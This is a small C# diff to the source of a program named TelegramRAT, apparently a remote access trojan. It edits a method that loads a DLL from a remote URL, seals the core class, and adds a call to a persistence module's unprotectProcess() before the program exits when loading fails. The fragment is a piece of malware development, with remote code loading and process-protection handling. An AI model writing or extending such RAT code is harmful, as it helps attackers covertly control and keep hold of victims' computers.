@@ -4,7 +4,7 @@ using System.Net;
 
 namespace TelegramRAT
 {
-    internal class core
+    internal sealed class core
     {
         // Load dll
         public static void LoadRemoteLibrary(string url)
@@ -18,7 +18,8 @@ namespace TelegramRAT
                 }
                 catch (WebException)
                 {
-                    Console.Write("Failed load libraries, not connected to internet!");
+                    Console.Write("[!] Failed load libraries, not connected to internet!");
+                    persistence.unprotectProcess();
                     Environment.Exit(1);
                 }
             }
